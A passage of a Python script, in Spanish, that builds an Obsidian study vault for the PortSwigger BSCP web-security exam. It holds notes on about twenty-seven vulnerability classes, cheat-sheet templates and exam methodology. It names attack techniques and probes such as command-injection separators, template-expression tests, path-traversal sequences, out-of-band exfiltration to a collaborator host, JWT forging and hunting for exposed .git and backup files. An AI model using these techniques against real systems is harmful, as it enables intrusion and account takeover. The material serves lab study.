/robots.txt   /sitemap.xml   (rutas ocultas anunciadas)
Envía tipos/valores inesperados en {{PARAM}} para forzar un stack trace verboso.
```""",
plantillas="""```
# Recursos y control expuestos
{{BASE}}/robots.txt
{{BASE}}/.git/HEAD                      (repositorio expuesto)
{{BASE}}/backup.zip   {{BASE}}/index.php.bak
{{BASE}}/main.js.map                    (source map -> código fuente)
```
```
# Forzar fugas por error / debug
TRACE {{BASE}}/                         (reflejo de headers)
{{PARAM}}=[]    {{PARAM}}='            (tipos inesperados -> stack trace)
Cabeceras reveladoras: Server, X-Powered-By, X-Debug
```""",
escalada="""Usar rutas/credenciales/tokens filtrados → login/admin → leer {{SECRET_PATH}}.""",
checklist="""- [ ] Revisé robots.txt / sitemap / .git / backups
- [ ] Forcé errores verbosos en {{PARAM}}
- [ ] Revisé source maps y cabeceras reveladoras
- [ ] Reutilicé lo filtrado para escalar""",
referencias="""- https://portswigger.net/web-security/information-disclosure""",
)

# ---------------------------------------------------------------------------
# PROSA por vulnerabilidad (secciones de 1.6)
# ---------------------------------------------------------------------------
PROSE = {
"sqli": ("Inyección de SQL: entrada del usuario que se concatena en una consulta y altera su lógica.",
         "Comilla simple que rompe la query, operadores booleanos con respuestas distintas, y retardos por tiempo.",
         "Detectar → determinar contexto y motor → UNION/error/blind → enumerar esquema → extraer credenciales.",
         "Robar credenciales de `{{TARGET_USER}}` para iniciar sesión como admin y cumplir el objetivo.",
         "Cuida los comentarios según motor (`--`, `#`, `--+`), el número exacto de columnas y el tipo de dato."),
"xss": ("Cross-Site Scripting: la app refleja/almacena entrada que se ejecuta como JavaScript en el navegador de la víctima.",
        "Inyecta un marcador único y busca dónde y en qué contexto aparece (HTML, atributo, JS, URL).",
        "Localizar reflexión → identificar contexto → romperlo → entregar vía `{{EXPLOIT}}` a `{{VICTIM}}`.",
        "Ejecución en el navegador del admin → robo de sesión o acción autenticada (cambio de email).",
        "Revisa CSP, codificación de salida y filtros; a veces basta un evento sin `script`."),
"csrf": ("Cross-Site Request Forgery: forzar al navegador de la víctima a enviar una petición de cambio de estado.",
         "Comprueba si la acción exige token anti-CSRF, si está ligado a sesión y la política SameSite.",
         "Elegir acción con estado → analizar la defensa → PoC auto-enviada desde `{{EXPLOIT}}`.",
         "Cambiar email/contraseña de `{{VICTIM}}` para tomar la cuenta.",
         "Prueba quitar token, POST→GET, token no ligado a sesión o en cookie, y SameSite Lax con GET."),
"clickjacking": ("Clickjacking: superponer la app objetivo en un iframe invisible para robar clics de la víctima.",
                 "Comprueba si la página se puede enmarcar (falta `X-Frame-Options`/`frame-ancestors`).",
                 "Confirmar framing → alinear un señuelo sobre el control sensible → engañar a `{{VICTIM}}`.",
                 "La víctima ejecuta sin querer una acción sensible (cambiar email, borrar cuenta).",
                 "Ajusta el offset del señuelo; algunas acciones requieren pre-rellenar campos vía URL."),
"dom": ("DOM-based: la vulnerabilidad vive en el JavaScript del cliente que lleva una fuente a un sumidero peligroso.",
        "Traza fuentes (`location.hash`, `document.URL`, `postMessage`) hasta sumideros (`innerHTML`, `eval`).",
        "Identificar fuente→sumidero (DOM Invader) → construir el payload adecuado al sink.",
        "DOM XSS ejecutado por `{{VICTIM}}` o open redirect para robar tokens.",
        "El payload depende del sumidero; parte de la entrada puede no salir al servidor."),
"cors": ("CORS mal configurado: la app refleja tu Origin y confía en él con credenciales.",
         "Envía `Origin` controlado y observa `Access-Control-Allow-Origin`/`-Credentials`.",
         "Confirmar reflejo con credenciales → exfiltrar datos autenticados desde `{{EXPLOIT}}`.",
         "Robar datos sensibles (API keys) de `{{VICTIM}}` para escalar a admin.",
         "Prueba `Origin: null`, subdominios con XSS y validaciones por prefijo/sufijo."),
"xxe": ("XML External Entity: un parser XML procesa entidades externas que definimos.",
        "Detecta entradas XML (body, SOAP, subida SVG/DOCX) y prueba una entidad que se resuelva.",
        "Detectar XML → leer fichero con `SYSTEM file://` → si es ciego, DTD OOB en `{{EXPLOIT}}`.",
        "Leer credenciales/ficheros o pivotar a SSRF interno vía XXE.",
        "Si no controlas el DOCTYPE, usa XInclude; la exfiltración ciega va por `{{COLLAB}}`."),
"ssrf": ("Server-Side Request Forgery: el servidor hace una petición a una URL que controlamos.",
         "Busca parámetros que acepten URL/host y apunta a localhost, red interna o metadata.",
         "Localizar `{{PARAM}}` URL → apuntar a interno → si hay filtro, ofuscar; si es ciego, `{{COLLAB}}`.",
         "Alcanzar la interfaz admin interna para una acción privilegiada o leer metadata cloud.",
         "Notaciones alternativas (`127.1`, decimal, IPv6) y trucos con `@`/`#` para saltar filtros."),
"smuggling": ("HTTP Request Smuggling: desincronizar front-end y back-end sobre dónde acaba una petición.",
              "Sonda de timing con `Transfer-Encoding`/`Content-Length` ambiguos (HTTP Request Smuggler).",
              "Detectar desync → clasificar CL.TE/TE.CL/TE.TE/CL.0 → capturar petición ajena o saltar controles.",
              "Capturar la petición de `{{VICTIM}}` (robar su cookie de admin) o bypass de `/admin`.",
              "Cuida los CRLF exactos y usa HTTP/1.1; el single-packet no aplica aquí."),
"cmdi": ("OS Command Injection: la entrada se pasa a un comando del sistema.",
         "Inyecta separadores (`;`, `&`, `|`, `` ` ``, `$()`) seguidos de un comando.",
         "Detectar `{{PARAM}}` que alimenta un comando → confirmar por retardo/OAST → recuperar salida.",
         "RCE para leer `{{SECRET_PATH}}` o exfiltrar a `{{COLLAB}}`.",
         "Si es ciego, usa `ping`/`nslookup`/`curl` o redirige la salida a un fichero servido por la web."),
"ssti": ("Server-Side Template Injection: la entrada se evalúa como plantilla del servidor.",
         "Prueba expresiones (`{{7*7}}`, `${7*7}`, `<%= 7*7 %>`) y observa si se evalúan.",
         "Confirmar evaluación → identificar el motor → escalar a lectura de fichero/RCE.",
         "RCE según el motor para leer `{{SECRET_PATH}}`.",
         "La sintaxis que evalúe delata el motor (Jinja2, Twig, Freemarker, ERB)."),
"path-traversal": ("Path Traversal: manipular un nombre de fichero para salir del directorio previsto.",
                   "Sube directorios con `../`; si hay filtro, codifica o anida las secuencias.",
                   "Localizar `{{PARAM}}` de fichero → traversal directo/codificado/anidado o ruta absoluta.",
                   "Leer ficheros sensibles o `{{SECRET_PATH}}` para obtener credenciales.",
                   "Prueba doble codificación, anidado `....//` y (legacy) null byte."),
"access-control": ("Access Control roto: falta de comprobación de autorización en rutas o recursos.",
                   "Prueba rutas admin directas, IDOR en identificadores y manipulación de rol.",
                   "Mapear roles/rutas → forced browsing/IDOR/manipular rol o headers de bypass.",
                   "Escalar a admin para borrar usuario o leer `{{SECRET_PATH}}`.",
                   "Prueba `X-Original-URL`, cambios de método y variaciones de mayúsculas en la ruta."),
"auth": ("Fallos de autenticación: enumeración, fuerza bruta, 2FA y flujos de reset débiles.",
         "Diferencias de respuesta/tiempo para enumerar usuarios; comportamiento del 2FA y del reset.",
         "Enumerar → fuerza bruta con Intruder → atacar 2FA/reset/persistencia de sesión.",
         "Comprometer `{{TARGET_USER}}` para acceder al panel admin.",
         "Revisa saltar al endpoint post-2FA, tokens de reset predecibles y Host header poisoning."),
"jwt": ("JWT inseguro: firma no verificada o verificable con clave que controlamos.",
        "Decodifica el token y observa `alg`, `kid`, `jwk/jku` y el claim de rol.",
        "Identificar token → `alg:none`/secreto débil/confusión de algoritmo → forjar token.",
        "Forjar un token con rol admin (usuario `{{TARGET_USER}}`) para entrar al panel.",
        "Con `alg:none` deja el punto final; RS256→HS256 usa la pública como secreto HMAC."),
"oauth": ("Fallos de OAuth: validación débil de `redirect_uri`, ausencia de `state` y fugas de `code`.",
          "Observa `redirect_uri`, si existe `state` y por dónde puede filtrarse el `code`.",
          "Trazar el flujo → atacar `redirect_uri`/`state`/fuga de `code`.",
          "Robar el `code`/token de `{{VICTIM}}` o vincular su cuenta para tomar su sesión.",
          "Cuida el account linking con email no verificado y el `code` en `Referer`."),
"websockets": ("WebSockets: canal bidireccional que puede transportar inyecciones y sufrir CSWSH.",
               "Intercepta el handshake y los mensajes; comprueba si valida `Origin`.",
               "Interceptar/manipular mensajes → probar XSS/SQLi → CSWSH si no valida Origin.",
               "CSWSH sobre la sesión de `{{VICTIM}}` para leer sus datos y escalar.",
               "La sesión sólo por cookie sin validar Origin habilita el hijacking desde `{{EXPLOIT}}`."),
"cache-poisoning": ("Web Cache Poisoning: envenenar la caché con una respuesta maliciosa vía inputs no incluidos en la clave.",
                    "Añade headers no incluidos en la clave y observa si se reflejan; usa cache buster.",
                    "Hallar input no incluido en la clave → reflejar payload → forzar el guardado en caché.",
                    "Servir XSS/redirect cacheado a todas las víctimas, incluido `{{VICTIM}}`.",
                    "Trabaja con cache buster mientras pruebas para no envenenar entradas reales."),
"deserializacion": ("Deserialización insegura: datos serializados manipulables que la app reconstruye en objetos.",
                    "Identifica formatos serializados (PHP `O:...`, Java `rO0AB`/`ac ed 00 05`).",
                    "Identificar formato → manipular campos para escalar → gadget chain si toca RCE.",
                    "Elevar privilegios o RCE para leer `{{SECRET_PATH}}`.",
                    "Abusa de `__wakeup`/`__destruct` y considera PHAR; en Java, ysoserial `⚠️`."),
"info-disclosure": ("Information Disclosure: fugas de datos por errores, backups, comentarios o ficheros de control.",
                    "Provoca errores verbosos y revisa `robots.txt`, `.git`, backups y source maps.",
                    "Provocar/leer fugas → recolectar rutas/versiones/credenciales → reutilizarlas.",
                    "Usar lo filtrado (rutas, credenciales, tokens) para llegar a admin o leer `{{SECRET_PATH}}`.",
                    "Los source maps (`.map`) reconstruyen el código; cabeceras `Server`/`X-Powered-By` delatan versiones."),
"business-logic": ("Business Logic: fallos por suposiciones incorrectas del desarrollador sobre el flujo.",
                   "Lista las suposiciones de cada flujo y comprueba si el servidor confía en el cliente.",
                   "Enumerar suposiciones → romperlas una a una (valores, orden de pasos, campos de confianza).",
                   "Comprar gratis, elevar rol o acceder a funciones de `{{TARGET_USER}}`.",
                   "Prueba valores negativos/desbordamiento, saltar pasos y reaplicar cupones."),
"host-header": ("Host Header attacks: la app confía en `Host`/`X-Forwarded-Host` para enlaces o routing.",
                "Manipula `Host`/`X-Forwarded-Host` y observa reflejo en enlaces o cambios de routing.",
                "Manipular Host → observar reflejo/routing → encadenar con reset o cache poisoning.",
                "Envenenar el enlace de reset de `{{VICTIM}}` para robar su token.",
                "Prueba `Host: localhost` para funciones internas y encadena con caché."),
"file-upload": ("File Upload inseguro: subir un fichero ejecutable y lograr que el servidor lo interprete.",
                "Sube un fichero y localiza su ruta; comprueba qué filtro aplica.",
                "Subir código → localizar la ruta → evadir el filtro → ejecutar.",
                "Ejecutar el shell para leer `{{SECRET_PATH}}`.",
                "Evasiones: doble extensión, `.phtml`, Content-Type spoof, magic bytes, traversal, `.htaccess`."),
"prototype-pollution": ("Prototype Pollution: contaminar `Object.prototype` para inyectar propiedades globales.",
                        "Contamina una propiedad de prueba y verifica en `Object.prototype`.",
                        "Contaminar el prototipo → hallar un gadget que el código lea → encadenar impacto.",
                        "Gadget → XSS en cliente o `isAdmin` en servidor → acceso admin.",
                        "En cliente usa DOM Invader; en servidor prueba `__proto__` y `constructor.prototype`."),
"nosqli": ("NoSQL Injection: inyectar operadores/sintaxis de la base NoSQL (p. ej. MongoDB).",
           "Inyecta comillas y operadores (`$ne`, `$regex`) y observa cambios de respuesta.",
           "Inyectar sintaxis Mongo → operadores para bypass o extracción ciega.",
           "Bypass de login como `{{TARGET_USER}}` o extracción ciega de credenciales.",
           "Distingue inyección en sintaxis (string) de inyección en operadores (JSON)."),
"graphql": ("GraphQL: abusar de introspección, aliasing/batching e IDOR en la API de grafo.",
            "Localiza el endpoint y confirma con `__typename`; corre introspección.",
            "Encontrar endpoint → introspección → abusar aliasing/batching e IDOR.",
            "Leer datos de `{{TARGET_USER}}` o forzar credenciales por batching → admin.",
            "El aliasing salta rate-limits; la introspección puede estar deshabilitada (prueba sugerencias)."),
"race-conditions": ("Race Conditions: explotar la ventana entre comprobación y acción con peticiones paralelas.",
                    "Busca comprobaciones previas a una acción (saldo, límite, cupón) con ventana temporal.",
                    "Identificar la ventana → enviar en paralelo (single-packet attack) → confirmar duplicado.",
                    "Duplicar saldo/cupón o saltar límites para lograr una ventaja hacia el objetivo.",
                    "Usa 'Send group in parallel' (single-packet) o Turbo Intruder para volumen."),
"api": ("API Testing: enumerar endpoints y abusar de mass assignment y tampering de método/tipo.",
        "Descubre rutas y métodos; prueba verbos alternativos y cambios de Content-Type.",
        "Descubrir endpoints → mass assignment → method/content-type tampering.",
        "Mass assignment de rol (`isAdmin`) → admin → borrar usuario / leer `{{SECRET_PATH}}`.",
        "Busca parámetros ocultos y server-side parameter pollution en la query interna."),
}

# ---------------------------------------------------------------------------
# GENERACIÓN
# ---------------------------------------------------------------------------
# Limpieza de carpetas del vault (idempotencia) preservando validar_vault.py
if os.path.isdir(VAULT):
    for name in ["00-Index","01-Vulnerabilidades","02-Cheatsheets","03-Labs","04-Recon-y-Herramientas","99-Recursos"]:
        p = os.path.join(VAULT, name)
        if os.path.isdir(p):
            shutil.rmtree(p)
os.makedirs(VAULT, exist_ok=True)

# --- Cheat sheets ---
for (display, base, slug, cs_ab, url, niveles) in TOPICS:
    parts = CS[cs_ab]
    front = fm({
        "tipo": "cheatsheet",
        "vuln": slug,
        "tags": ["bscp", "tipo/cheatsheet", f"vuln/{slug}"],
        "relacionada": f'"[[{base}]]"',
    })
    body = f"""{front}

# CS · {display}

## Flujo repetible
{parts['flujo']}

## Detección
{parts['deteccion']}

## Plantillas de payload
{parts['plantillas']}

## Escalada al objetivo
{parts['escalada']}

## Checklist
{parts['checklist']}

## Referencias
{parts['referencias']}
"""
    w(f"02-Cheatsheets/CS-{cs_ab}.md", body)

# --- Notas de vulnerabilidad ---
for (display, base, slug, cs_ab, url, niveles) in TOPICS:
    que, det, flu, esc, got = PROSE[slug]
    front = fm({
        "tipo": "vulnerabilidad",
        "vuln": slug,
        "tags": ["bscp", "tipo/vulnerabilidad", f"vuln/{slug}"],
        "niveles": niveles,
        "cheatsheet": f'"[[CS-{cs_ab}]]"',
        "academy": academy_url(url),
        "estado": "pendiente",
    })
    body = f"""{front}

# {display}

## Qué es
{que}

## Cómo detectar
{det}

## Flujo de explotación
{flu}

## Escalada a impacto
{esc}

## Gotchas de examen
{got}

## Cheat sheet
[[CS-{cs_ab}]]

## Labs
[[_Tracker-{base}]]

## Enlaces
- {academy_url(url)}
"""
    w(f"01-Vulnerabilidades/{base}.md", body)

# --- Labs (una nota de ejemplo por tema) + Trackers ---
for (display, base, slug, cs_ab, url, niveles) in TOPICS:
    nivel = "practitioner" if "practitioner" in niveles else "apprentice"
    lab_name = f"Lab-{base}-01-ejemplo-base"
    lab_front = fm({
        "tipo": "lab",
        "vuln": slug,
        "nivel": nivel,
        "tags": ["bscp", "tipo/lab", f"vuln/{slug}", f"nivel/{nivel}", "estado/pendiente"],
        "fase": ["1-acceso"],
        "url": "",
        "estado": "pendiente",
    })
    lab_body = f"""{lab_front}

# {display} · Lab 01 — Ejemplo base

## Objetivo
Reproducir el flujo genérico de {display} contra `{{{{BASE}}}}` hasta cumplir el objetivo del examen.

## Fase(s)
- 1-acceso (adaptar a 2-admin / 3-secret según el lab concreto)

## Pasos realizados
1. Detectar el punto de inyección en `{{{{PARAM}}}}` siguiendo [[CS-{cs_ab}]].
2. Confirmar la vulnerabilidad con la sonda mínima.
3. Explotar con la plantilla parametrizada correspondiente.

## Payload usado
Ver plantillas parametrizadas en [[CS-{cs_ab}]] (placeholders `{{{{BASE}}}}`, `{{{{PARAM}}}}`, `{{{{COLLAB}}}}`).

## Qué generalizo
La lección reutilizable que devuelvo a la cheat sheet tras resolver el lab.

## Enlace academy
- {academy_url(url)}
"""
    w(f"03-Labs/{base}/{lab_name}.md", lab_body)

    tr_front = fm({
        "tipo": "moc",
        "vuln": slug,
        "tags": ["bscp", "tipo/moc", f"vuln/{slug}"],
    })
    tr_body = f"""{tr_front}

# Tracker · {display}

Registro de progreso de labs de {display}. Relacionada: [[{base}]] · Cheat sheet: [[CS-{cs_ab}]].

| Lab | Nivel | Fase | Estado | Notas |
|---|---|---|---|---|
| [[{lab_name}]] | {nivel} | 1-acceso | pendiente | Ejemplo base parametrizado |
"""
    w(f"03-Labs/{base}/_Tracker-{base}.md", tr_body)

# --- Plantillas ---
w("00-Index/_Plantillas/Plantilla-Vulnerabilidad.md", """---
tipo: vulnerabilidad
vuln: SLUG
tags: [bscp, tipo/vulnerabilidad, vuln/SLUG]
niveles: [apprentice, practitioner]
cheatsheet: "[[CS-ABREV]]"
academy: https://portswigger.net/web-security/TEMA
estado: pendiente
---

# TITULO

## Qué es

## Cómo detectar

## Flujo de explotación

## Escalada a impacto

## Gotchas de examen

## Cheat sheet
[[CS-ABREV]]

## Labs
[[_Tracker-TITULO]]

## Enlaces
- https://portswigger.net/web-security/TEMA
""")

w("00-Index/_Plantillas/Plantilla-Cheatsheet.md", """---
tipo: cheatsheet
vuln: SLUG
tags: [bscp, tipo/cheatsheet, vuln/SLUG]
relacionada: "[[NOMBRE-VULN]]"
---

# CS · NOMBRE

## Flujo repetible

## Detección

## Plantillas de payload

## Escalada al objetivo

## Checklist

## Referencias
- https://portswigger.net/web-security/TEMA
""")

w("00-Index/_Plantillas/Plantilla-Lab.md", """---
tipo: lab
vuln: SLUG
nivel: practitioner
tags: [bscp, tipo/lab, vuln/SLUG, nivel/practitioner, estado/pendiente]
fase: [1-acceso]
url:
estado: pendiente
---

# TITULO

## Objetivo

## Fase(s)

## Pasos realizados

## Payload usado

## Qué generalizo

## Enlace academy
- https://portswigger.net/web-security/TEMA
""")

# --- MOC ---
moc_front = fm({"tipo":"moc","tags":["bscp","tipo/moc"]})
vuln_links = "\n".join(f"- [[{base}]] — [[CS-{cs_ab}]]" for (d,base,slug,cs_ab,u,n) in TOPICS)
tracker_rows = "\n".join(f"| [[{base}]] | [[_Tracker-{base}]] | pendiente |" for (d,base,slug,cs_ab,u,n) in TOPICS)
moc = f"""{moc_front}

# MOC · BSCP

Punto de entrada del vault. Metodología: [[Metodologia-Examen]] · [[Metodologia-Discovery]].
Herramientas: [[Burp-Scanner]] · Recursos: [[Enlaces-Utiles]].

> 🧠 **Sistema de estudio multi-agente:** [[README-Sistema]] · [[Dashboard]] · [[Preferencias]]
> Agentes: [[Agente-Tutor]] · [[Agente-Examinador]] · [[Agente-Redactor]] · [[Agente-Planificador]]

## Vulnerabilidades y cheat sheets
{vuln_links}

## Progreso de labs (Dataview)
```dataview
TABLE nivel, fase, estado
FROM "03-Labs"
WHERE tipo = "lab"
SORT vuln ASC
```

## Progreso de labs (tabla de respaldo)
> Si Dataview no está instalado, usa esta tabla y los trackers por tema.

| Vulnerabilidad | Tracker | Estado global |
|---|---|---|
{tracker_rows}
"""
w("00-Index/MOC-BSCP.md", moc)

# --- Metodología Examen ---
w("00-Index/Metodologia-Examen.md", """---
tipo: moc
tags: [bscp, tipo/moc]
---

# Metodología de Examen (BSCP)

El examen tiene 2 aplicaciones; en cada una hay que llegar de un usuario sin privilegios a leer el secreto/borrar al usuario objetivo. Trabaja siempre en 3 fases.

## Fase 1 — Acceso (#fase/1-acceso)
1. Recon completo de la app (ver [[Metodologia-Discovery]]).
2. Encuentra una vía para autenticarte o robar una sesión de bajo privilegio.
3. Lanza [[Burp-Scanner]] en paralelo mientras exploras a mano.

## Fase 2 — Admin (#fase/2-admin)
1. Desde el acceso inicial, busca escalar a `{{TARGET_USER}}` (normalmente `administrator`).
2. Encadena vulnerabilidades: robo de sesión de `{{VICTIM}}`, IDOR, JWT/OAuth, etc.

## Fase 3 — Secret (#fase/3-secret)
1. Con acceso admin, ejecuta la acción final: leer `{{SECRET_PATH}}` o borrar al usuario objetivo.

## Reglas de oro
- Corre Burp Scanner sobre TODO desde el minuto uno.
- Anota cada endpoint y parámetro; parametriza con el glosario.
- Cada hallazgo reutilizable vuelve a su cheat sheet (`## Qué generalizo`).

## Enlaces
- [[MOC-BSCP]]
""")

# --- Metodología Discovery ---
w("00-Index/Metodologia-Discovery.md", """---
tipo: moc
tags: [bscp, tipo/moc]
---

# Metodología de Discovery

Flujo repetible de reconocimiento que se aplica igual en cualquier objetivo `{{BASE}}`.

## 1. Mapa de la aplicación
- Navega toda la funcionalidad con el proxy activo (site map en Burp).
- Identifica roles, flujos de autenticación y acciones de cambio de estado.

## 2. Contenido oculto
- Fuerza rutas comunes y revisa `robots.txt`, `sitemap.xml`, `.git`, backups.
- Revisa JS del cliente y source maps (`.map`) para endpoints y parámetros.

## 3. Superficie por parámetro
- Lista cada `{{PARAM}}` y clasifícalo (SQL, comando, plantilla, URL, fichero, XML…).
- Marca los candidatos por tipo para elegir la cheat sheet adecuada.

## 4. Automatiza + manual
- [[Burp-Scanner]] en toda la app; revisa issues y confírmalos a mano.
- Usa Collaborator (`{{COLLAB}}`) para vulnerabilidades ciegas/OOB.

## Enlaces
- [[MOC-BSCP]] · [[Metodologia-Examen]]
""")

# --- Burp Scanner ---
w("04-Recon-y-Herramientas/Burp-Scanner.md", """---
tipo: recurso
tags: [bscp, tipo/recurso]
---

# Burp Scanner (uso en el examen)

## Flujo repetible
1. Define el scope en `{{BASE}}` y activa el proxy.
2. Navega la app para poblar el site map (mejor cobertura del crawl).
3. Lanza un **scan** (crawl + audit) sobre el host objetivo.
4. Mientras escanea, sigue probando a mano con las cheat sheets.
5. Revisa la pestaña **Issues**: confirma cada hallazgo manualmente antes de explotarlo.

## Buenas prácticas
- Corre el scanner desde el minuto uno en ambas apps.
- Prioriza issues de severidad alta que encajen con el objetivo (SQLi, XSS, access control).
- No te fíes de falsos positivos: reproduce el issue en Repeater.
- Combina con Collaborator (`{{COLLAB}}`) para detectar vulnerabilidades ciegas.

## Extensiones útiles
- HTTP Request Smuggler, Param Miner, JWT Editor, InQL, DOM Invader, Turbo Intruder.

## Enlaces
- [[MOC-BSCP]]
- https://portswigger.net/burp/documentation/scanner
""")

# --- Enlaces Útiles ---
w("99-Recursos/Enlaces-Utiles.md", """---
tipo: recurso
tags: [bscp, tipo/recurso]
---

# Enlaces útiles

## Oficiales PortSwigger
- Web Security Academy: https://portswigger.net/web-security
- All learning materials: https://portswigger.net/web-security/all-materials
- Burp Suite docs: https://portswigger.net/burp/documentation
- BSCP (certificación): https://portswigger.net/web-security/certification

## Referencia rápida por tema
- SQL Injection cheat sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
- XSS cheat sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- Placeholders del vault: `{{BASE}}`, `{{PARAM}}`, `{{COLLAB}}`, `{{EXPLOIT}}`, `{{TARGET_USER}}`, `{{VICTIM}}`, `{{SECRET_PATH}}`, `{{CMD}}`.

## Enlaces
- [[MOC-BSCP]]
""")

print("Vault generado en:", VAULT)
